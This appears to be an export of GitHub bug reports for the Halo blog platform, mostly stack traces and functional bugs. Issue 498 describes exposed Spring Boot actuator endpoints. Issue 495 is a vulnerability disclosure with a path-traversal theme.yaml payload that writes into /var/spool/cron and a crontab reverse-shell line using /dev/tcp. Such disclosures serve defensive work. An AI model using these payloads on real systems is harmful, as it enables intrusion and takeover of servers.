~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) ~[undertow-core-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) ~[undertow-core-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:132) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.RedirectDirHandler.handleRequest(RedirectDirHandler.java:68) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.27.Final.jar!/:2.0.27.Final] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.1.RELEASE.jar!/:5.2.1.RELEASE] ```  ---  ## 期望行为  &lt;!--   你期望会发生什么？ --&gt;  ## 当前行为  &lt;!--   描述 bug 细节，确认出现此问题的复现步骤，例如点击了哪里，发生了什么情况？    你可以粘贴截图或附件。 --&gt;  https://bbs.halo.run/d/473</body>
		<created>2020-01-29 12:52:46</created>
		<closed>2020-02-20 06:47:57</closed>
	</bug>
	<bug>
		<id>520</id>
		<title>启动时，如果没有找到目标主题将会启动失败</title>
		<body>&lt;!--   你好！感谢你正在考虑为 Halo 提交一个 bug。请花一点点时间尽量详细地回答以下基础问题。    谢谢！ --&gt;  &lt;!--    请确认你已经做了下面这些事情，若 bug 还是未解决，那么请尽可详细地描述你的问题。    - 我已经安装了最新版的 Halo   - 我已经搜索了已有的 Issues 列表中有关的信息   - 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - 我已经阅读了 Halo 的 FAQ：https://halo.run/guide/faq.html --&gt;  ## 我的环境  Server 版本：1.2.0 Admin 版本：1.2.0 数据库：H2 运行模式：production UA 信息：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36  &lt;!--    请登录到博客后台，进入菜单 `系统-&gt;关于` 点击 `环境信息` 旁边的按钮即可复制环境信息。 --&gt;  ---  ## 错误日志  ```log run.halo.app.exception.NotFoundException: 没有找到 id 为 codelunatic_simple 的主题         at run.halo.app.service.impl.ThemeServiceImpl.lambda$getThemeOfNonNullBy$0(ThemeServiceImpl.java:108) ~[classes!/:1.2.0]         at java.base/java.util.Optional.orElseThrow(Optional.java:408) ~[na:na]         at run.halo.app.service.impl.ThemeServiceImpl.getThemeOfNonNullBy(ThemeServiceImpl.java:108) ~[classes!/:1.2.0]         at run.halo.app.service.impl.ThemeServiceImpl.getActivatedTheme(ThemeServiceImpl.java:374) ~[classes!/:1.2.0]         at run.halo.app.listener.freemarker.FreemarkerConfigAwareListener.loadThemeConfig(FreemarkerConfigAwareListener.java:99) ~[classes!/:1.2.0]         at run.halo.app.listener.freemarker.FreemarkerConfigAwareListener.onApplicationStartedEvent(FreemarkerConfigAwareListener.java:58) ~[classes!/:1.2.0]         at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:na]         at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:na]         at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na] ```  &lt;!--    请登录到博客后台，点击菜单栏中的 `Halo Dashboard` 10 次即可开启 `开发者选项`。进入开发者选项中的 `实时日志`。   你可以选择查找具体的错误日志，或者直接下载日志文件复制到下面即可。（注意：日志堆栈信息请用 Markdown 的代码块语法，以方便查看。） --&gt;  ---  ## 期望行为  没有找到目标主题启动就会失败，不太完美，如果没有找到目标主题就默认设置为anatole主题，这样将不会因为主题原因而导致的启动失败。  &lt;!--   你期望会发生什么？ --&gt;  ## 当前行为  当前启动的时候会自动初始化anatole主题，但是并不会在没有找到目标主题的情况下自动设置为anatole主题，而是导致启动失败。  &lt;!--   描述 bug 细节，确认出现此问题的复现步骤，例如点击了哪里，发生了什么情况？    你可以粘贴截图或附件。 --&gt;</body>
		<created>2020-01-27 06:28:59</created>
		<closed>2020-01-27 06:44:19</closed>
	</bug>
	<bug>
		<id>517</id>
		<title>开发者选项中的实时日志行顺序有问题</title>
		<body>&lt;!--   你好！感谢你正在考虑为 Halo 提交一个 bug。请花一点点时间尽量详细地回答以下基础问题。    谢谢！ --&gt;  &lt;!--    请确认你已经做了下面这些事情，若 bug 还是未解决，那么请尽可详细地描述你的问题。    - 我已经安装了最新版的 Halo   - 我已经搜索了已有的 Issues 列表中有关的信息   - 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - 我已经阅读了 Halo 的 FAQ：https://halo.run/guide/faq.html --&gt;  ## 我的环境  &lt;!--    请登录到博客后台，进入菜单 `系统-&gt;关于` 点击 `环境信息` 旁边的按钮即可复制环境信息。 --&gt;  Server 版本：1.2.0 Admin 版本：1.2.0 数据库：H2 运行模式：production UA 信息：Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36  ---  ## 错误日志  &lt;!--    请登录到博客后台，点击菜单栏中的 `Halo Dashboard` 10 次即可开启 `开发者选项`。进入开发者选项中的 `实时日志`。   你可以选择查找具体的错误日志，或者直接下载日志文件复制到下面即可。（注意：日志堆栈信息请用 Markdown 的代码块语法，以方便查看。） --&gt;  ---  ## 期望行为  &lt;!--   你期望会发生什么？ --&gt;  正序。  ## 当前行为  &lt;!--   描述 bug 细节，确认出现此问题的复现步骤，例如点击了哪里，发生了什么情况？    你可以粘贴截图或附件。 --&gt;  输出行的顺序有误。  ``` 2020-01-24 22:45:55.763 ERROR 600 --- [XNIO-1 task-13] .s.h.DefaultAuthenticationFailureHandler : Authentication failure 2020-01-24 22:45:55.761  WARN 600 --- [XNIO-1 task-13] .s.h.DefaultAuthenticationFailureHandler : Handle unsuccessful authentication, ```</body>
		<created>2020-01-24 14:48:33</created>
		<closed>2020-02-10 13:48:06</closed>
	</bug>
	<bug>
		<id>498</id>
		<title>Springboot actuator unauthorized access vulnerability in the  Backend </title>
		<body>&lt;!--   你好！感谢你正在考虑为 Halo 提交一个 bug。请花一点点时间尽量详细地回答以下基础问题。    谢谢！ --&gt;  &lt;!--    请确认你已经做了下面这些事情，若 bug 还是未解决，那么请尽可详细地描述你的问题。    - 我已经安装了最新版的 Halo   - 我已经搜索了已有的 Issues 列表中有关的信息   - 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - 我已经阅读了 Halo 的 FAQ：https://halo.run/guide/faq.html --&gt;  ## Environment Window &amp; Ubuntu &amp; Centos   ---  ##  vulnerability detail When logged into the background ![image](https://user-images.githubusercontent.com/42834114/72504142-34208980-3878-11ea-9919-53f509f82e4a.png)  We access this interface: ``` ip:/api/admin/actuator/ ``` ![image](https://user-images.githubusercontent.com/42834114/72504236-6205ce00-3878-11ea-84f0-35d03ac71f83.png) The monitored endpoint is leaked under the actuator path。   For example, under the env path, all environmental attribute configuration information is leaked, including a large amount of server-sensitive information: ``` http://ip/api/admin/actuator/env ``` ![image](https://user-images.githubusercontent.com/42834114/72504614-1d2e6700-3879-11ea-993d-739fde5e53e2.png) The logfile path leaked the server's real-time log records: ``` http://ip/api/admin/actuator/logfile  ``` ![image](https://user-images.githubusercontent.com/42834114/72504804-86ae7580-3879-11ea-91a6-b883237f5ecc.png) Under the metrics path, various application metrics information was leaked, such as memory usage and HTTP request counts： ![image](https://user-images.githubusercontent.com/42834114/72504920-ca08e400-3879-11ea-8031-03ef34ac1204.png)    ---  ## Reason  View source configuration file application.yaml: ![image](https://user-images.githubusercontent.com/42834114/72505163-56b3a200-387a-11ea-9944-8f4b36a8f0ca.png) It can be found that the Actuator service is enabled by default, but the access permissions are not set.  If Spring Boot Actuator version is too low, there is a remote code execution vulnerability，See details here： ``` https://www.veracode.com/blog/research/exploiting-spring-boot-actuators ``` </body>
		<created>2020-01-16 08:18:13</created>
		<closed>2020-02-25 06:28:37</closed>
	</bug>
	<bug>
		<id>495</id>
		<title>An Arbitrary file writing vulnerability in the backend</title>
		<body>&lt;!--   你好！感谢你正在考虑为 Halo 提交一个 bug。请花一点点时间尽量详细地回答以下基础问题。    谢谢！ --&gt;  &lt;!--    请确认你已经做了下面这些事情，若 bug 还是未解决，那么请尽可详细地描述你的问题。    - 我已经安装了最新版的 Halo   - 我已经搜索了已有的 Issues 列表中有关的信息   - 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - 我已经阅读了 Halo 的 FAQ：https://halo.run/guide/faq.html --&gt;  ## environment ubuntu16.04 &amp; centos &lt;!--    请登录到博客后台，进入菜单 `系统-&gt;关于` 点击 `环境信息` 旁边的按钮即可复制环境信息。 --&gt;  ---  ## vulnerability detail The function for adding the new theme in the backend ![image1](https://raw.githubusercontent.com/PeteLing/photo/master/cve1.png) the theme.yaml in the zip  ``` id: abc/../../../../halotest name: test222 author:   name: test   website: test description: A other Halo the2me logo: http://test.ceye.io website: https://github.com/halo-dev/halo-theme-tes repo: https://github.com/halo-dev/halo-theme-anateste version: 1.1 ``` we look for the system directory ![image2](https://raw.githubusercontent.com/PeteLing/photo/master/cve2.png) Therefore, the attacker can overwrite some files, such as ftl files, .bashrc files or crontab file in the user directory, and finally get the shell and permissions of the operating system.  ---  ## Get Shell I have tested in the centos server `root` file in the zip `* * * * * bash -i &gt;&amp; /dev/tcp/ip/7777 0&gt;&amp;1` `theme.yaml` in the zip ``` id: abc/../../../../../var/spool/cron name: test222 author:   name: tes2t2   website: test description: A other Halo the2me logo: http://test.ceye.io website: https://github.com/halo-dev/halo-theme-tes repo: https://github.com/halo-dev/halo-theme-anateste version: 1.1 ``` upload the zip file and get the shell in hacker server ![image3](https://raw.githubusercontent.com/PeteLing/photo/master/cve5.png)  &lt;!--    请登录到博客后台，点击菜单栏中的 `Halo Dashboard` 10 次即可开启 `开发者选项`。进入开发者选项中的 `实时日志`。   你可以选择查找具体的错误日志，或者直接下载日志文件复制到下面即可。（注意：日志堆栈信息请用 Markdown 的代码块语法，以方便查看。） --&gt;  ---  ## Reason the function in the ThemeServiceImple.java. get the `id` in the theme.yaml  and use it directly without `checkDirectoryTraversal` ```     @Override     public ThemeProperty add(Path themeTmpPath) throws IOException {         Assert.notNull(themeTmpPath, "Theme temporary path must not be null");         Assert.isTrue(Files.isDirectory(themeTmpPath), "Theme temporary path must be a directory");          log.debug("Children path of [{}]:", themeTmpPath);          try (Stream&lt;Path&gt; pathStream = Files.list(themeTmpPath)) {             pathStream.forEach(path -&gt; log.debug(path.toString()));         }          // Check property config         ThemeProperty tmpThemeProperty = getProperty(themeTmpPath);          // Check theme existence         boolean isExist = getThemes().stream()                 .anyMatch(themeProperty -&gt; themeProperty.getId().equalsIgnoreCase(tmpThemeProperty.getId()));          if (isExist) {             throw new AlreadyExistsException("当前安装的主题已存在");         }          // Copy the temporary path to current theme folder         Path targetThemePath = themeWorkDir.resolve(tmpThemeProperty.getId());         FileUtils.copyFolder(themeTmpPath, targetThemePath);          // Get property again         ThemeProperty property = getProperty(targetThemePath);          // Clear theme cache         this.eventPublisher.publishEvent(new ThemeUpdatedEvent(this));          // Delete cache         return property;     } ```</body>
		<created>2020-01-13 03:58:17</created>
		<closed>2020-01-16 08:47:17</closed>
	</bug>
	<bug>
		<id>493</id>
		<title>首次初始化的时候导致无法正确加载管理端的主页</title>
		<body># 截至 commit  commit de796b35d6e2fa1131180f4688c70af1940f0536  # 异常信息  ```java 2020-01-12 00:48:07.462 ERROR 20146 --- [ XNIO-2 task-16] r.h.a.controller.core.CommonController   : Captured an exception  org.springframework.web.util.NestedServletException: Request processing failed; nested exception is run.halo.app.exception.NotFoundException: Not Found at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1014) ~[spring-webmvc-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898) ~[spring-webmvc-5.2.1.RELEASE.jar:5.2.1.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:503) ~[jakarta.servlet-api-4.0.3.jar:4.0.3] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) ~[spring-webmvc-5.2.1.RELEASE.jar:5.2.1.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:590) ~[jakarta.servlet-api-4.0.3.jar:4.0.3] at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:103) ~[spring-web-5.2.1.RELEASE.jar:5.2.1.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:108) ~[spring-boot-actuator-2.2.1.RELEASE.jar:2.2.1.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.1.RELEASE.jar:5.2.1.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) ~[spring-web-5.2.1.RELEASE.jar:5.2.1.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.RedirectDirHandler.handleRequest(RedirectDirHandler.java:68) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:132) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.27.Final.jar:2.0.27.Final] at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) ~[undertow-core-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) ~[undertow-core-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) ~[undertow-core-2.0.27.Final.jar:2.0.27.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.27.Final.jar:2.0.27.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) ~[undertow-core-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:269) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:78) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:133) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:130) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:249) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:78) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:99) ~[undertow-servlet-2.0.27.Final.jar:2.0.27.Final] at io.undertow.server.Connectors.executeRootHandler(Connectors.java:376) ~[undertow-core-2.0.27.Final.jar:2.0.27.Final] at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:830) ~[undertow-core-2.0.27.Final.jar:2.0.27.Final] at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128) ~[na:na] at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628) ~[na:na] at java.base/java.lang.Thread.run(Thread.java:834) ~[na:na] Caused by: run.halo.app.exception.NotFoundException: Not Found at run.halo.app.controller.content.ContentContentController.content(ContentContentController.java:114) ~[classes/:na] at run.halo.app.controller.content.ContentContentController$$FastClassBySpringCGLIB$$b6cfcb07.invoke(&lt;generated&gt;) ~[classes/:na] at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) ~[spring-core-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:769) ~[spring-aop-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.aop.aspectj.MethodInvocationProceedingJoinPoint.proceed(MethodInvocationProceedingJoinPoint.java:88) ~[spring-aop-5.2.1.RELEASE.jar:5.2.1.RELEASE] at run.halo.app.core.ControllerLogAop.controller(ControllerLogAop.java:48) ~[classes/:na] at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:na] at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:na] at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na] at java.base/java.lang.reflect.Method.invoke(Method.java:566) ~[na:na] at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs(AbstractAspectJAdvice.java:644) ~[spring-aop-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod(AbstractAspectJAdvice.java:633) ~[spring-aop-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.aop.aspectj.AspectJAroundAdvice.invoke(AspectJAroundAdvice.java:70) ~[spring-aop-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:93) ~[spring-aop-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) ~[spring-aop-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:747) ~[spring-aop-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:689) ~[spring-aop-5.2.1.RELEASE.jar:5.2.1.RELEASE] at run.halo.app.controller.content.ContentContentController$$EnhancerBySpringCGLIB$$53e1dccd.content(&lt;generated&gt;) ~[classes/:na] at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:na] at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) ~[na:na] at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) ~[na:na] at java.base/java.lang.reflect.Method.invoke(Method.java:566) ~[na:na] at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190) ~[spring-web-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) ~[spring-web-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:106) ~[spring-webmvc-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:888) ~[spring-webmvc-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:793) ~[spring-webmvc-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1040) ~[spring-webmvc-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) ~[spring-webmvc-5.2.1.RELEASE.jar:5.2.1.RELEASE] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) ~[spring-webmvc-5.2.1.RELEASE.jar:5.2.1.RELEASE] ... 46 common frames omitted  2020-01-12 00:48:07.470 DEBUG 20146 --- [ XNIO-2 task-16] r.h.a.controller.core.CommonController   : Error detail: [{timestamp=Sun Jan 12 00:48:07 CST 2020, status=404, error=Not Found, message=Not Found, path=/a/index.html}] 2020-01-12 00:48:07.471 DEBUG 20146 --- [ XNIO-2 task-16] run.halo.app.core.ControllerLogAop       : CommonController.handleError Response: ["themes/anatole/404"], usage: [15]ms  ```</body>
		<created>2020-01-11 16:53:34</created>
		<closed>2020-02-11 03:02:08</closed>
	</bug>
	<bug>
		<id>488</id>
		<title>【BUG】博客首页显示的文章数量不对</title>
		<body>## 我的环境   Halo版本：最新版（docker不指定版本安装）   操作系统：Centos7 MYSQL：5.7.21  ## 环境信息  Server 版本：1.1.1 Admin 版本：1.1.1 数据库：MySQL 运行模式：production 启动时间：2020-01-05 22:18  ## 错误日志 无  ## 期望行为  博客首页显示的【文章】数量为为**已发布**的文章数量，不应该包含**草稿**。      PS：后台首页显示的【文章】数量则是**已发布**的文章数量，不包含**草稿**。    ## 当前行为  博客首页的【文章】数量显示的是包含**草稿**的数量。    ## 附上截图  ![当前编辑的文章（其中一篇是草稿）](https://www.wenjie.store//bug/后台首页文章.png)  ![后台显示的文章数量为4（不包含草稿）](https://www.wenjie.store//bug/halo/后台首页显示文章数量.png)  ![博客首页显示文章5（包含草稿）](https://www.wenjie.store//bug/halo/首页显示的文章数量等.png)   </body>
		<created>2020-01-11 08:18:39</created>
		<closed>2020-01-11 11:22:15</closed>
	</bug>
	<bug>
		<id>487</id>
		<title>RSS 报错</title>
		<body> - 我已经安装了最新版的 Halo   - 我已经搜索了已有的 Issues 列表中有关的信息   - 我已经搜索了论坛中有关的信息：https://bbs.halo.run   - 我已经阅读了 Halo 的 FAQ：https://halo.run/guide/faq.html  ## 我的环境  ```txt Server 版本：1.2.0 Admin 版本：1.2.0 数据库：MySQL 运行模式：production UA 信息：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36 Edg/79.0.309.63 ```  ## 错误日志   无相关错误日志   ## 期望行为 正常返回相关数据  ## 当前行为 ![image](https://user-images.githubusercontent.com/33031194/72198214-2d9fa580-3465-11ea-95ed-7c66c278155d.png)  我使用的Pinghsu 主题，点击页脚处的RSS。</body>
		<created>2020-01-11 03:28:47</created>
		<closed>2020-01-11 03:38:18</closed>
	</bug>
	<bug>
		<id>485</id>
		<title>新版本1.2.0 不支持mariaDB 10.1</title>
